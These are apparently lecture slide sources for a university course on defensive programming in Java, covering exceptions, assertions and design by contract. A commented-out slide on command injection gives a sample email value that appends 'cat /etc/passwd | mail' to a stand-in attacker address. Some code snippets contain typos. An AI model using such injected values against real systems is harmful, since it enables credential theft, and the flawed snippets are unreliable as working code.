---
author:
- Dr. Isaac Griffith
title: Defensive Programming
course: CS 2263
institute: Idaho State University
fontsize: 11pt
headerlogo: "images/header-logo.png"
footerlogo: "images/footer-logo.png"
titlelogo: "images/title-logo.png"
outline: false
...

# Outcomes

After today's lecture you will be able to:

::: columns
:::: {.column width=.7}
* Understand the basic ideas of defensive coding
* Understand how exceptions relate to defensive coding and fault tolerant coding
::::
:::: {.column width=.25}
\vfill
\vspace{5.75em}
\centering
\includegraphics[width=\textwidth]{images/brain-gears-invert2.png}
::::
:::

#

\titleslide{.65\textwidth}{Defensive Programming}


# Defensive Programming

* Programming defensively means making your code **robust** to unexpected use.

\vskip.5em

* Use the **need to know** principle: Only expose the parts of your class that your client classes need to know

\vskip.5em

* Java exceptions provide a uniform way of handling errors

# Why Program Defensively?

* Normally, your classes will form part of a larger system

\vskip.5em

* So other programmers will be using and relying upon your classes

\vskip.5em

* Obviously, your classes should be *correct*, but equally importantly, you classes should be *robust* -- that is, resistant to accidental misuse by other programmers

\vskip.5em

* You should aim to ensure that no errors in the final system can be attributed to the behavior of your classes

\vskip.5em

* We use the terminology *"client code"* for the code written by other programmers that are using your classes.

#

\titleslide{.4\textwidth}{Error Handling}

# Error Handling Concepts

* Murphy's Law
  - "Anything that can go wrong will go wrong"

\vskip.5em

* Error conditions will occur, and your code needs to deal with them
  - Out of memory, disk full, file missing, file corrupted, network error, ...

\vskip.5em

* Software should be tested to see how it performs under various error conditions
  - Simulate errors and see what happens

\vskip.5em

* Just because your program works on your computer doesn't mean that it will work everywhere else

\vskip.5em

* You'll be amazed at how many weird things will go wrong when your software is used out in the "wild"

# Error Handling Concepts

* What should a program do when an error occurs?

\vskip.5em

* Some errors are "recoverable" - the program is able to recover and continue normal operation

\vskip.5em

* Many errors are "unrecoverable" - the program cannot continue and gracefully terminates

\vskip.5em

* Most errors are detected by low-level routines that are deeply nested in the call stack

\vskip.5em

* Low-level routines usually can't determine how the program should respond

\vskip.5em

* Information about the error must be passed up the call stack to higher-level routines that can determine the appropriate response

# Propagating Error Information

* Return Codes

\vskip.5em

* Status Parameter

\vskip.5em

* Error State

\vskip.5em

* Exceptions

<!--# Return Codes

* A method uses its return value to tell the caller whether or not it succeeded
* In case of failure, the particular value returned can be used to determine the nature of the error

```java
int openFile(string fileName) {
  // ...
}

int result = openFile("index.html");
if (result < 0) {
  switch (result) {
    case -1: // file doesn't exist
    case -2: // file isn't writable
    case -3: // max number of files already open
  }
}
```

# Return Codes

* Disadvantages of return codes
  - You have to use the return value to return error info even if you'd rather use it to return something else
  - Every time you call a method, you need to write code to check the return value for errors
    - All of the error-checking code obscures the main flow of the program
  - It's easy to write code that simply ignores errors because nothing forces you to check return values

# Status Parameter

* A method has an additional parameter through which it returns status information
* In case of failure, the particular value returned through the parameter can be used to determine the nature of the error

```java
enum Status { GOOD, NOEXIST, NOWRITE, MAXOPEN };
void openFile(String filename, Status status) { ... }

Status status;
openFile("index.html", status)
if (status != Status.GOOD) {
  switch (status) {
    case NOEXIST: // file doesn't exist
    case NOWRITE: // file isn't writable
    case MAXOPEN: // max number of files already open
  }
}
```

# Status Parameter

* Disadvantages of status parameters
  - Every method call has an extra parameter (but you can use the return value for whatever you want)
  - Every time you call a method, you need to write code to check the status parameter's value for errors
    - All of the error-checking code obscures the main flow of the program
  - It's easy to write code that simply ignores errors because nothing forces you to check the status parameter

# Error State

* Methods don't return error info
  - If something went wrong, you can't tell
* Objects store error info internally
* If you want to know if failures have occurred, you must query the object by calling a method

# Error State

* Disadvantages of error state
  - Every time you call a method, you need to write code to check the object's error state
    - All of the error-checking code obscures the main flow of the program
  - It's easy to write code that simply ignores errors because nothing forces you to check the error state-->

#

\titleslide{.375\textwidth}{Exceptions}

# Why Exceptions

* Exceptions are an elegant mechanism for handling errors without the disadvantages of the other techniques
  - Return values aren't tied up
  - No extra parameters
  - Error handling code isn't mixed in with the "normal" code
  - You can't ignore exceptions - if you don't handle them, your program will crash

\vskip.5em

* After an exception is thrown, the runtime will try to locate the relevant **exception handler**

\vskip.5em

* Runtime **searches back** through the call stack and will stop at the first relevant exception handler

# Tracing the Call Stack

\begin{center}
\includegraphics[width=.8\textwidth]{images/defensive/stack1.eps}
\end{center}

# Re-Tracing the Call Stack

\begin{center}
\includegraphics[width=.85\textwidth]{images/defensive/stack2.eps}
\end{center}

# Catch or Specify

* Requirement for code that **might throw exception**:

  - Possess a `try` statement to catch exception
  - Method specifies that the exception can be thrown using the `throws` clause

# Step 1: Add Try Block

\footnotesize
```java
    private List<Integer> list;
    private static final int SIZE = 10;

    public void writeList() {
      PrintWriter out = null;
      try {
        // Exception thrown somewhere within this block
        System.out.println("Entered try statement");
        out = new PrintWriter(new FileWriter("OutFile.txt"));
        for (int i = 0; i < SIZE; i++) {
          out.println("Value at: " + i + " = " + list.get(i));
        }
      } // End of try block
      //... catch and finally blocks ...
    }
```

# Step 2: Add Catch Block

\footnotesize
```java
    try {
      // Exception thrown somewhere within this block
      System.out.println("Entered try statement");
      out = new PrintWriter(new FileWriter("OutFile.txt"));
      for (int i = 0; i < SIZE; i++) {
        out.println("Value at: " + i + " = " + list.get(i));
      }
    } catch (IndexOutOfBoundsExceptoin e) {
      System.err.println("IndexOutOfBoundsException: " + e.getMessage());
    } catch (IOException e) {
      System.err.println("Caught IOException: " + e.getMessage());
    }
```

# Step 3: Add Optional Finally Block

\footnotesize
```java
    finally {
      if (out != null) {
        System.out.println("Closing PrintWriter");
        out.close();
      } else {
        System.out.println("PrintWriter not open");
      }
    }
```

* Finally block is always executed

\vskip.5em

* Useful place to perform cleanup work after success or fail

\vskip.5em

* Typical usage is to release resources by calling **close()**

\vskip.5em

* Avoids resource leaks

<!--#

\vfill
\centering
\Huge Example

# Initial Form

```java
public void writeList() {
  PrintWriter out = new PrintWriter(new FileWriter("OutFile.txt"));
  for (int i = 0; i < SIZE; i++) {
    out.println("Value at: " + i + " = " + list.get(i));
  }
  out.close();
}
```

# Final Form

\scriptsize
```java
public void writeList() {
  PrintWriter out = null;
  try {
    // Exception thrown somewhere within this block
    System.out.println("Entered try statement");
    out = new PrintWriter(new FileWriter("OutFile.txt"));
    for (int i = 0; i < SIZE; i++) {
      out.println("Value at: " + i + " = " + list.get(i));
    }
  } catch (IndexOutOfBoundsExceptoin e) {
    System.err.println("IndexOutOfBoundsException: " + e.getMessage());
  } catch (IOException e) {
    System.err.println("Caught IOException: " + e.getMessage());
  } finally {
    if (out != null) {
      System.out.println("Closing PrintWriter");
      out.close();
    } else {
      System.out.println("PrintWriter not open");
    }
  }
}
```-->

# Try-with-resource Alternative

\footnotesize
```java
    static String readFirstLineFromFile(String path) throws IOException {
      try (BuffererdReader br = new BufferedReader(new FileReader(path))) {
        return br.readLine();
      }
    }
```

* Try statement that declares one or more resources

\vskip.5em

* Resources are objects that must be released after use

\vskip.5em

* Requires the object to implement `java.lang.Autoclosable`

# Using throws clause

* The current method may not always be the appropriate place to deal with an exception

\vskip.5em

* Instead, exception handling can be located elsewhere and exceptions forwarded up the call stack

\footnotesize
```java
    public void writeList() throws IOException, IndexOutOfBoundsException {
      PrintWriter out = new PrintWriter(new FileWriter("OutFile.txt"));
      for (int i = 0; i <s SIZE; i++) {
        out.println("Value at: " + i + " = " + list.get(i));
      }
      out.close();
    }
```

\centering
\large Do we need both to be declared?

# Using throw statement

* Exceptions can be generated from any point in a program

\vskip.5em

* Simply `throw new ExceptionType;`

\footnotesize

```java
    public Object pop() {
      Object obj;

      if (size == 0) {
        throw new EmptyStackException();
      }

      obj = objectAt(size - 1);
      setObjectAt(size - 1, null);
      size--;
      return obj;
    }
```

# Best Practices

* Use exceptions only for exceptional conditions

\vskip.5em

\footnotesize
```java
    // Horrible abuse of exceptions. Don't ever do this
    try {
      int i = 0;
      while (true)
        range[i++].climb();
    } catch (ArrayIndexOutOfBoundsException e) {
    }
```

\vskip.5em

* Use checked expressions for recoverable conditions and runtime exceptions for programming errors
  - e.g. File not found vs. array indexing problem

# Best Practices

* Avoid unnecessary use of checked exceptions
  - Creates a difficult to use API

\vskip.5em

* Favor the standard exceptions:
  - `IllegalArgumentException`, `IllegalStateException`
  - `NullPointerException`, `IndexOutOfBoundsException`
  - `ConcurrentModificationException`
  - `UnsupportedOperationException`


\vskip.5em

* Document all exceptions thrown by methods

\vskip.5em

* Include failure-capture information in detailed messages

\vskip.5em

* Don't ignore exceptions

# Kinds of Exceptions

* **Checked Exception**
  - Application should anticipate and recover from
  - e.g., `java.io.FileNotFoundException`

\vskip.5em

* **Error**
  - Circumstances external to the application
  - e.g., Hardware Failure
  - Cannot be caught

\vskip.5em

* **Runtime Exception**
  - Internal to the application, typically bugs
  - e.g., `NullPointerException` (can be caught, but better to abort and fix)
  - Do not need to be specified

# For the Lazy Programmer...

::: columns
:::: column
* Both Error and RuntimeExceptions are **unchecked exceptions**

\vskip.5em

* Programmers can avoid the catch or specify requirement by **extending** their exception classes from `Error` or `RuntimeExceptions`

\vskip.5em

* Silences the compiler :-)
::::
:::: column
\begin{center}
\includegraphics[width=.95\textwidth]{images/defensive/hierarchy.eps}
\end{center}
::::
:::

#

\titleslide{.375\textwidth}{Assertions}

# Assertions

* As we write code, we make many assumptions about the state of the program and the data it processes
  - A variable's value is in a particular range
  - A file exists, is writable, is open, etc.
  - The maximum size of the data is N (e.g., 1000)
  - The data is sorted
  - A network connection to another machine was successfully opened
  - ...

\vskip.5em

* The correctness of our program depends on the validity of our assumptions

\vskip.5em

* Faulty assumptions result in buggy, unreliable code

# Assertions

* Boolean expressions

\vskip.5em

* Used to check:
  - Pre-conditions
    - reflect **requires** clause
    - Test client
  - Post-conditions
    - reflect **effects** clause
    - test procedure
  - Invariants

\vskip.5em

* Include specification in the software

# Invariants

* **Invariant** -- "A rule, such as the ordering of an ordered list or heap, that applies throughout the life of a data structure or procedure. Each change to the data structure must maintain the correctness of the invariant"

\vskip.5em

* **Class Invariant** -- if the "data structure" above is a class

# Invariants Example

\footnotesize

```java
    class CharStack {
      private char[] cArr; // internal rep
      private int i = 0;
      void push (char c) {
        cArr[i] = c;
        i++;
      }
    }
```

* The invariant in this example is: "**i** should always be equal to the size of the stack (i.e., point at one above at the top of the stack)"

# Assertions in Java

* Added in JDK 1.4

\vskip.5em

* General Syntax:

\footnotesize
```java
    assert expression1 : expression2
```


\vskip.5em

* Examples:

\footnotesize
```java
    assert value >= 0;
    assert someInvariantTrue();
    assert value >= 0 : "Value must be > 0: value = " + value;
```


\vskip.5em

* `> javac *.java`

\vskip.5em

* `> java -ea MyClass`

# Handling Assertions in Java

* Evaluate $expression_1$
  - If true
    - No further action
  - If false
    - And if $expression_2$ exists
      Evaluate $expression_2$ and throw AssertionError(expression2)
  - Else
    - Use the default AssertionError constructor

# Care with Assertions

* Side effects in assertions


\vskip.5em

\footnotesize
```java
    void push (char c) {
      cArr[i] = c;
      assert (i++ == topElement());
    }
```

* Change of flow in assertions

\vskip.5em

* Performance vs. correctness
  - Open issue

# Assertions vs. Exceptions

* If one of my assumptions is wrong, shouldn't I throw an exception rather than use an assertion?

\vskip.5em

* Assertions are used to find and remove bugs before software is shipped
  - Assertions are turned off in the released software

\vskip.5em

* Exceptions are used to deal with errors that can occur even if the code is completely correct
  - Out of memory, disk full, file missing, file corrupted, network error, ...

# Assertions vs. Exceptions

\footnotesize

```java
    // In Class Sensor:
    public void setSampleRate(int rate) throws SensorException {
        if (rate < MIN_HERTZ || MAX_HERTZ < rate)
          throw new SensorException("Illegal rate: " + rate);

        this.rate = rate;
    }

    public void setSampleRate(int rate) {
      assert MIN_HERTZ <= rate && rate <= MAX_HERTZ :
        "Illegal rate: " + rate;

      this.rate = rate;
    }
```

# Parameter Checking

* Another important defensive programming technique is "parameter checking"

\vskip.5em

* A method or function should always check its input parameters to ensure that they are valid

\vskip.5em

* Two ways to check parameter values
  - assert
  - if statement that throws exception if parameter is invalid

\vskip.5em

* Which should you use, asserts or exceptions?
\pause

\vskip.5em

* If you have control over the calling code, use asserts
  - If parameter is invalid, you can fix the calling code

\vskip.5em

* If you don't have control over the calling code, throw exceptions
  - e.g., your product might be a class library

<!--#

\titleslide{.45\textwidth}{Input Validation}

# Input Validation

* Input validation problems are *the* most common vulnerabilities
  - All programs take user-supplied input
* Programs without input validation could be open to many attacks
* Examples:
  - Format string attacks, SQL injection, command injection, Cross Site Scripting

# General Advice: "All Input is Evil"

* Always check that your input is as you expect
  - Are you expecting a user to enter a color?
    - Verify it's a real color then
    - Or, force them to choose a color from a list
* Assume the worst -- although most of your users are probably going to be "good guys", hackers have access to your program too
* \color{Roarange} Think like an attacker!\color{Black}
  - Think how you might abuse a system with weird input

#

\vfill
\centering
\includegraphics[width=\textwidth]{images/defensive/exploits_of_a_mom.png}

# Sources of Input

::: columns
:::: column
* Command line
* Environment Variables
* File Names
* File Contents (indirect?)
::::
:::: column
This is **not** a complete enumerated list, these are only **examples** You must do input validation of *all* channels where untrusted data comes form (at least).
::::
:::
* Network Connections
* Web-Based Application Inputs: URL, POST, etc.
* Other Inputs
  - Database systems & other external services
  * Registry/System property
  * ...

Which sources of input matter depends on the kind of application, application environment, etc. What follows are *potential* channels

# Minimize the **Attack Surface**

* Make attack surface as small as possible
  - Disable channels (e.g., ports) and methods (APIs)
  - Prevent access to them by attackers (firewall, access control)
* Make sure you know *every* system entry point
  - Network: Scan system to make sure
* For the remaining surface, as soon as possible:
  - Ensure it's authenticated & authorized (if appropriate)
  - Ensure that all untrusted input is valid (input filtering)
    * Untrusted input = Any input from a source not *totally* trusted
    * Failures here are CWE-20: **Improper Input Validation**
  - Many would argue "validate all input", not just untrusted
    * Trusted admins make mistakes too!

# Example: Converting Grades

\footnotesize
```java
import java.util.*;

public class TestScore {
  public static void main(String[] args) {
    Scanner console = new Scanner(System.in);
    System.out.println("Enter test score");
    int testScore = console.nextInt();

    if (testScore >= 90) System.out.println("Your grade is A");
    else if (testScore >= 80) System.out.println("Your grade is B");
    else if (testScore >= 70) System.out.println("Your grade is C");
    else if (testScore >= 60) System.out.println("Your grade is D");
    else System.out.println("Your grade is F");
  }
}
```

\vspace{-1.5em}
\begin{center}
\large
What input-validation problems this program has?

Well, it doesn't check for negative grades or grades greater than 100.
\end{center}

# Is This Security Critical?

* You might think these are just harmless, annoying programming problems
* But some of them might cause security problems
  - Format string attacks
    * The program doesn't expect the input contains things like "%d", "%n", "%s"

# Command Injection

* An application inputs an email address from a user and writes the address to a buffer

```c
sprintf(buffer, "/bin/mail < /tmp/email %s", addr);
```

The buffer is then executed using the `system()` call

* The risk is, of course, that the user enters the following string as an email address;
* `bogus@addr.com; cat /etc/passwd | mail some@badguy.net`

# SQL Injection

\centering
\includegraphics[width=.75\textwidth]{images/defensive/sqlinject1.eps}

# SQL Injection

::: columns
:::: column

\centering
\includegraphics[width=.85\textwidth]{images/defensive/sqlinject2.eps}

::::
:::: column

\centering
\includegraphics[width=.85\textwidth]{images/defensive/sqlinject3.eps}

::::
:::

# XSS

::: columns
:::: column

\centering
\includegraphics[width=.85\textwidth]{images/defensive/xss1.eps}

::::
:::: column

\centering
\includegraphics[width=.85\textwidth]{images/defensive/xss2.eps}

::::
:::

#

\titleslide{.525\textwidth}{Design By Contract}

# Design By Contract

These principles are about reliability. There are fundamentally two (not mutually exclusive) approaches to make software more reliable:

* **Design by contract:** write a clear contract on how method caller is supposed to use method, and assume caller is disciplined and obeys the contract to *e.g.* not pass a null object.

* **Defensive Programming:** library writer is cautious and is guarding against callers improperly *e.g.* passing null object by explicitly checking for that condition and taking appropriate action.

Another way to view it is DbC puts the onus on the *caller* and DP puts the onus on the *callee* of a method to meet the specification

# DbC Example

\begin{center}
\includegraphics[width=.85\textwidth]{images/principles/hfooand-contractual-example.jpg}
\end{center}

# DP Example

\begin{center}
\includegraphics[width=.75\textwidth]{images/principles/hfooand-defensive-example.jpg}
\end{center}

# DbC and DP

\footnotesize
Which to do and how much?

* You should usually be doing some of both in different aspects of application
* If there is a contract make sure it is *documented* or users of API will not know about it.
* The more distant your users are (e.g., if you are writing a library), the more defensive & contractual you need to be

Tradeoffs:

* Defensive programming can slow down code due to the overhead of all the checks and raise new exceptions at runtime whereas contracts are compile-time

* Contracts are just words so code may in fact not obey the intent of the contract and without defensive programming backup something bad could happen at runtime.

#

\titleslide{.725\textwidth}{Contracts for Java (Cofoja)}

# Cofoja??

* An annotation processing tool which provides java with design by contract capabilities
* This allows for run-time checking (similar to assertions) rather than static checking

# Installing

* Can be used by simply adding the following dependency:

    ```java
    configurations {
      cofoja
    }

    dependencies {
      cofoja group: 'org.huoc', name: 'cofoja', version: '1.3.1'
      compile configuration.cofoja.dependencies
    }

    test {
      jvmArgs '-ea', '-javaagent:' + configurations.cofoja.files[0]
    }
    ```

* Note you will need to allow annotation processing and ensure that it is correctly configured

# Basics

* We can use Cofoja to define pre- and post-conditions for our methods
  - preconditions are defined using the `@Requires` annotation
  - postconditions are defined using the `@Ensures` annotation

* We can use Cofoja to define class level invariants
  - invariants are defined using the `@Invariant` annotation

# Violations

* If we violate a precondition, a `PreconditionError` is thrown
* If we violate a postcondition, a `PostconditionError` is thrown
* If we violate an invariant, an `InvariantError` is thrown

# DbC vs. Assertions

**Advantages**

- DbC allows application logic to be separated from contract logic
- The contract is included in the JavaDoc
  * assertions force us to maintain both the contract and the documentation separately, which is error prone
- Provides enhanced defect localization and reduced debugging time
- Helps to easily determine the cause of an error

**Disadvantages**

- Lack of native language support

# Contracts and Inheritance

* The contracts defined are applicable to all objects of an associated type.
  - This includes any instances of derived classes

* Derived classes may refine contracts with additional
  - Preconditions
  - Postconditions
  - Invariants

* Derived classes may not replace inherited contracts, but
  - Preconditions may be weakened
  - Postconditions may be strengthened
  - Invariants may be strengthened

# Example

* An implementation of Java's `List` `add(int index, E element)` method with a contract

  ```java
  @Requires({"index >= 0", "index <= size()"})
  @Ensures({"element.equals(get(index))"})
  public void add(int index, E element) {
    // implementation
  }
  ```

# Keywords

* There are several keywords which allow DbC to work:
  - `old` - the value on method entry (applies to `@Ensures`)
  - `result` - the value to be returned (applies to `@Ensures`)

* Example:

  ```java
  @Requires("x >= 0")
  @Ensures("result == 2 * old(x)")
  static double doubleIt(double x);
  ```

# Example Old

* The `@ThrowEnsures` annotation guarantees that the exception method exits do not inadvertently alter the state of the object.
  - The keyword `signal` is used to access the exception object that was thrown

```java
class RestrictedInteger {
  int x;

  @Ensures("x == y")
  @ThrowEnsures({ "IllegalArgumentException", "x == old (x)" })
  void setX(int y) throws IllegalArgumentException {
    ...
  }
}
```

# Example

* An invariant to indicate that a Set may contain only unique elements

  ```java
  @Invariant("hasUniqueElements()")
  public class InvariantSet<E> {
    // implementation
  }
  ```

# Extended Example

\tiny
::: columns
:::: column
```java
import java.util.LinkedList;
import com.google.java.contract.Ensures;
import com.google.java.contract.Invariant;
import com.google.java.contract.Requires;

@Invariant({ "elements != null",
             "isEmpty() || top() != null" }) // (1)
public class CofojaStack<T> {

  private final LinkedList<T> elements = new LinkedList<T>();

  @Requires("o != null") // (2)
  @Ensures({ "!isEmpty()", "top() == o" }) // (3)
  public void push(T o) {
    elements.add(o);
  }

  @Requires("!isEmpty()")
  @Ensures({ "result == old(top())", "result != null" })
  public T pop() {
    final T popped = top();
    elements.removeLast();
    return popped;
  }
```

::::
:::: column
```java

  @Requires("!isEmpty()")
  @Ensures("result != null")
  public T top() {
    return elements.getLast();
  }

  public boolean isEmpty() {
    return elements.isEmpty();
  }

}
```
::::
:::-->

# For Next Time

::: columns
:::: column
* Review this lecture
* Watch Lecture 25
::::
:::: column
\centering
\includegraphics[width=.85\textwidth]{images/next_time-invert2.png}
::::
:::

#

\vfill
\centering
\includegraphics[scale=.40]{images/questions-invert2.png}

\Huge \textbf{Are there any questions?}
